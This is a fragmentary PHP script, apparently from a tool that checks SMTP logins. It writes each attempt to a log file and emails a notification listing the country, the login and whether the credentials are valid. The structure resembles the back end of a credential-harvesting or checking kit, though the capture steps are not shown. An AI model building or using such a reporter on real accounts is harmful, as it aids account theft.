...
// Prepare log message
$log_message = "=== SMTP CREDENTIAL TEST #$attempt_number ===\n";
...
// Log to file
$log_file = "smtp_credential_test_log.txt";
@file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);

// Prepare email subject based on result
if ($validCredentials) {
    $subject = "✅ VALID SMTP CREDENTIALS - $country - $login - Attempt #$attempt_number";
    $email_status = "VALID SMTP CREDENTIALS DETECTED";
} else {
    $subject = "❌ INVALID SMTP CREDENTIALS - $country - $login - Attempt #$attempt_number";
    $email_status = "INVALID SMTP CREDENTIALS";
}
...
<body>
    <div class='header " . ($validCredentials ? "valid" : "invalid") . "'>
        <h2>SMTP Credential Test - Login Attempt</h2>
...
try {
    ...
    $notifyMail->FromName = 'SMTP Credential Tester';
